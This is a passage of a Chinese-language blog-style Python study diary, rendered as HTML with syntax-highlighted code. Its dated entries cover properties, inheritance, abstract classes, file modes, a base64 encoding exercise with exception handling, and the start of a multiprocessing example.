class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age,sex,school</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># 单下划线强调变量受保护的</span><br>        self._name=name <br>        self._age=age<br>        self._sex=sex<br>        self._school=school<br>    <br>    <br>    <span class="hljs-comment"># 真正的getter</span><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br>    <br><span class="hljs-meta">    @property </span><span class="hljs-comment"># 可以使用object.name而不需要使用()</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._age<br>    <br>    <br><span class="hljs-meta">    @name.setter </span><span class="hljs-comment"># 创建了property才能使用</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self,name</span>):<br>        self._name=name<br>        <br><br><span class="hljs-meta">    @age.setter</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self,age</span>):<br>        self._age=age<br><br>wx=Student(<span class="hljs-string">&quot;wx&quot;</span>,<span class="hljs-number">19</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;cuit&quot;</span>)<br><br><span class="hljs-comment"># 由于添加了@property可以像成员变量一样访问，但是更加的安全</span><br><span class="hljs-built_in">print</span>(wx.name)<br>wx.name=<span class="hljs-string">&quot;wwxx&quot;</span><br><span class="hljs-built_in">print</span>(wx.name)<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> 使用装饰器修改昨天的代码</p><p>修改定义点(Point)类</p></li></ul><h1 id="23-10-17"><a href="#23-10-17" class="headerlink" title="23_10_17"></a>23_10_17</h1><p>学习继承</p><p>继承，作为脚本语言这个用的不是很多（至少是我）</p><p>开发用的多</p><ul><li><p><input disabled="" type="checkbox"> 静态方法</p><p>这个java里面有默认你知道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@staticmethod </span><span class="hljs-comment"># 静态方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_age</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.__age<br></code></pre></td></tr></table></figure><p>就是添加了一个修饰</p></li><li><p><input disabled="" type="checkbox"> 类方法</p><p>类方法代表了与类本身信息相关的函数，第一个参数规定了是<code>cls</code></p><p>下面是我理解的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@classmethod  </span><span class="hljs-comment"># 类方法</span><br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">getClassName</span>(<span class="hljs-params">cls</span>):<br>       <span class="hljs-keyword">return</span> cls.__name__ <span class="hljs-comment"># 返回当前类的名称</span><br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> 继承</p><p>注意看Student的括号，需要包含父类，也就是需要继承的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-comment"># 限定Person对象只能绑定_name, __age和__sex属性</span><br>    _slots_ = (<span class="hljs-string">&quot;__name&quot;</span>, <span class="hljs-string">&quot;__age&quot;</span>, <span class="hljs-string">&quot;__sex&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex</span>) -&gt; <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 后置返回值</span><br>        self.__name = name<br>        self.__age = age<br>        self.__sex = sex<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex, school</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__(name, age, sex)  <span class="hljs-comment"># 调用父类的构造函数</span><br>        self.__school = school<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.__name<br><br><span class="hljs-meta">    @staticmethod  </span><span class="hljs-comment"># 静态方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_age</span>():<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.__age<br><br><span class="hljs-meta">    @classmethod  </span><span class="hljs-comment"># 类方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getClassName</span>(<span class="hljs-params">cls</span>):<br>        <span class="hljs-keyword">return</span> cls.__name__<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> 多态</p><p>我们也可以对一个父类函数进行重写，当多个子类的调用同一个方法的结果不一样，这个就是多态（我的理解）</p></li></ul><h1 id="23-10-18"><a href="#23-10-18" class="headerlink" title="23_10_18"></a>23_10_18</h1><p>抽象就是虚函数之类的东西</p><ul><li><p><input disabled="" type="checkbox"> 给vscode安装以下</p><blockquote><p>Better Comments</p><p>Error Lens</p></blockquote></li><li><p><input disabled="" type="checkbox"> 研究代码 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-keyword">import</span> abc <br>  <span class="hljs-comment"># !这里的类一定要导入</span><br>  <br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(metaclass=abc.ABCMeta):<br>  <br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>          self.__name = name<br>          self.__age = age<br>  <br><span class="hljs-meta">      @abc.abstractmethod</span><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">behavior</span>():<br>          <span class="hljs-keyword">pass</span><br>  <br><span class="hljs-meta">      @property</span><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>          <span class="hljs-keyword">return</span> self.__name<br>      <br><span class="hljs-meta">      @name.setter</span><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params">self,name</span>):<br>          self.__name = name<br>  <br><span class="hljs-meta">      @property</span><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self</span>):<br>          <span class="hljs-keyword">return</span> self.__age<br>      <br><span class="hljs-meta">      @age.setter</span><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">setAge</span>(<span class="hljs-params">self,age</span>):<br>          self.__age = age<br>  <br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>      <br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, school</span>):<br>          <span class="hljs-built_in">super</span>().__init__(name, age)<br>          self.__school = school<br>      <br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">behavior</span>(<span class="hljs-params">self</span>):<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;m studying&quot;</span>)<br>      <br><span class="hljs-meta">      @property</span><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">school</span>(<span class="hljs-params">self</span>):<br>          <span class="hljs-keyword">return</span> self.__school<br>          <br><span class="hljs-meta">      @school.setter</span><br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">setSchool</span>(<span class="hljs-params">self,school</span>):<br>              self.__school = school<br>  <br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">behavior</span>(<span class="hljs-params">self</span>):<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;studying&quot;</span>)<br>  <br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>  <br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>          <span class="hljs-built_in">super</span>().__init__(name, age)<br>          <br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">behavior</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;teaching&quot;</span>)<br>          <br>  <span class="hljs-comment"># !注意观察同样一个函数的输出结果</span><br>        wx=Student(<span class="hljs-string">&quot;wx&quot;</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;CUIT&quot;</span>)<br>        wx.behavior()<br>        chg=Teacher(<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">18</span>)<br>        chg.behavior()<br>  <br>  <span class="hljs-comment"># ?一些原因我现在使用的是vscode写markdown,可能对python的格式会发生变化</span><br><br><br><br><span class="hljs-comment"># 23_10_19</span><br>首先文件存在的意义就是对数据持久化操作<br><br>- [ ] 学习如何打开权限<br><br>  C语言差不多<br><br>  | 操作模式 | 具体含义             |<br>  | -------- | -------------------- |<br>  | r        | 读权限               |<br>  | w        | 写权限（会更新内容） |<br>  | x        | 文件存在就会抛出异常 |<br>  | a        | 追加模式             |<br>  | b        | 二进制模式           |<br>  | t        | 文本模式             |<br>  | +        | 更新（可读可写）     |<br><br>  老用心了哈哈哈<br><br>  ![image-<span class="hljs-number">20231019005237389</span>](https://allinit-<span class="hljs-number">1317182407.</span>cos.ap-nanjing.myqcloud.com/python/%E6%<span class="hljs-number">96</span>%<span class="hljs-number">87</span>%E4%BB%B6/image-<span class="hljs-number">20231019005237389.</span>png)<br><br>  ```python<br>  <span class="hljs-comment"># ?文件操作学习请注意</span><br>  <br>  <span class="hljs-comment"># 首先创建一个文本，我们使用&#x27;w&#x27;模式没有的话就会创建一个</span><br>  <br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;wxLearn.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>      <span class="hljs-comment"># 没有的话就会创建一个</span><br>      inputStr = <span class="hljs-string">&quot;wxLearn&quot;</span><br>      f.write(inputStr)<br>  <span class="hljs-comment"># !这样使用会自动close</span><br>  <br>  <span class="hljs-comment"># 普通的使用方法</span><br>  f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;wxLearn.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>  outputStr = f.readline()<br>  <span class="hljs-built_in">print</span>(outputStr)<br>  f.close()  <span class="hljs-comment"># !一定要close</span><br>  <br></code></pre></td></tr></table></figure><p>剩下的自己多去敲敲看吧</p></li></ul><h1 id="23-10-21"><a href="#23-10-21" class="headerlink" title="23_10_21"></a>23_10_21</h1><p>我感觉基本已经学习完了，后面主要就是开发会使用的了</p><p>现在的你可以愉快的敲python了嘛？</p><p>进入今天的练习吧</p><ul><li><p><input disabled="" type="checkbox"> 创建一个文件为my_base64.py<br>写一个抽象类（EnAndDecode）</p><p>包含两个抽象函数</p><ul><li>encode(str)</li><li>decode(str)</li></ul><p>再写一个类base64实现他的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> abstractclassmethod, ABCMeta<br>  <br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnAndDecode</span>(metaclass=ABCMeta):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">pass</span><br>  <br><span class="hljs-meta">    @abstractclassmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>        <span class="hljs-keyword">pass</span><br>  <br><span class="hljs-meta">    @abstractclassmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>():<br>        <span class="hljs-keyword">pass</span><br>  <br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base64</span>(<span class="hljs-title class_ inherited__">EnAndDecode</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__()<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">string</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        answer = base64.b64encode(base64_bytes)<br>        <span class="hljs-keyword">return</span> answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">string</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        answer = base64.b64decode(base64_bytes)<br>        <span class="hljs-keyword">return</span> answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>  <br></code></pre></td></tr></table></figure><p>经供参考，写的比我好的人有很多</p></li></ul><h1 id="23-10-22"><a href="#23-10-22" class="headerlink" title="23_10_22"></a>23_10_22</h1><ul><li><p><input disabled="" type="checkbox"> 其实就是一个语句，看下面的代码</p></li><li><p><input disabled="" type="checkbox"> base64项目添加异常处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> abstractclassmethod, ABCMeta<br>  <br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnAndDecode</span>(metaclass=ABCMeta):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">pass</span><br>  <br><span class="hljs-meta">    @abstractclassmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>        <span class="hljs-keyword">pass</span><br>  <br><span class="hljs-meta">    @abstractclassmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>():<br>        <span class="hljs-keyword">pass</span><br>  <br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base64</span>(<span class="hljs-title class_ inherited__">EnAndDecode</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__()<br>  <br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">string</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">try</span>:<br>            base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            answer = base64.b64encode(base64_bytes)<br>            <span class="hljs-keyword">return</span> answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># 当运行出错</span><br>            <span class="hljs-built_in">print</span>(e)<br>  <br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">string</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">try</span>:<br>            base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            answer = base64.b64decode(base64_bytes)<br>            <span class="hljs-keyword">return</span> answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>  <br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_n</span>(<span class="hljs-params">string, n</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            <span class="hljs-keyword">try</span>:<br>                base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                answer = base64.b64encode(base64_bytes)<br>                string = answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">return</span> string<br>  <br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_n</span>(<span class="hljs-params">string</span>):<br>        count = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                string = base64.b64decode(base64_bytes)<br>                string = string.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> string, count<br>  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>():<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">          1. base64加密</span><br><span class="hljs-string">          2. base64解密</span><br><span class="hljs-string">          3. base64加密n次</span><br><span class="hljs-string">          4. base64解密n次&quot;&quot;&quot;</span><br>    )<br>  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOption</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        option = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;你的选择是什么？:&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            option = <span class="hljs-built_in">int</span>(option)<br>            <span class="hljs-keyword">if</span> option <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]:<br>                <span class="hljs-keyword">return</span> option<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请输入正确的选项&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请输入正确的选项&quot;</span>)<br>  <br>  <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 菜单</span><br>    menu()<br>    <span class="hljs-comment"># 选项</span><br>    option = getOption()<br>  <br>    <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要加密的内容：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(Base64.encode(string))<br>    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要解密的内容：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(Base64.decode(string))<br>    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要加密的内容：&quot;</span>)<br>        n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;你要加密几次？：&quot;</span>))          <span class="hljs-comment"># !这里可以做类型检查</span><br>        <span class="hljs-built_in">print</span>(Base64.encode_n(string, n))<br>    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">4</span>:<br>        string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入你要解密的内容：&quot;</span>)<br>        answer,count=Base64.decode_n(string)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;你的密文一共加密<span class="hljs-subst">&#123;count&#125;</span>次,结果是：<span class="hljs-subst">&#123;answer&#125;</span>&quot;</span>)<br>  <br></code></pre></td></tr></table></figure></li></ul><h1 id="23-10-24"><a href="#23-10-24" class="headerlink" title="23_10_24"></a>23_10_24</h1><ul><li><p><input disabled="" type="checkbox"> 学习多进程</p><h1 id="python里面的多进程"><a href="#python里面的多进程" class="headerlink" title="python里面的多进程"></a>python里面的多进程</h1><h2 id="unix和linux"><a href="#unix和linux" class="headerlink" title="unix和linux"></a>unix和linux</h2><ol><li><p>使用fork()  来调用系统创建一个进程</p><p>这样创建的进程是一个子进程，拷贝的父进程的</p><p>但是子进程都存在自己的PID</p><p>fork的它可以做到返回两次</p><p>在父进程里fork返回的是子进程的PID，在子进程里返回的永远都是0</p></li></ol><h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><ol><li><p>multiprocessing</p><p>使用这个model里面的Process创建子进程</p><p>并且在这个里面还进行了更高级的封装</p><p>进程池(pool)  消息队列(Queue)  管道(Pipe)</p></li><li><p>下面是一段对比</p><p><strong>不适用多进程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep<br><br><br><span class="hljs-comment"># 不使用多进程</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work_out</span>():<br>    start = time()<br>    <span class="hljs-built_in">all</span> = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>):<br>        <span class="hljs-built_in">all</span> = <span class="hljs-built_in">all</span> * i<br>        <span class="hljs-comment"># print(all)</span><br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗的时间为 ：<span class="hljs-subst">&#123;end-start&#125;</span>\n&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    start = time()<br>    work_out()<br>    work_out()<br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗时间为:<span class="hljs-subst">&#123;end-start&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span 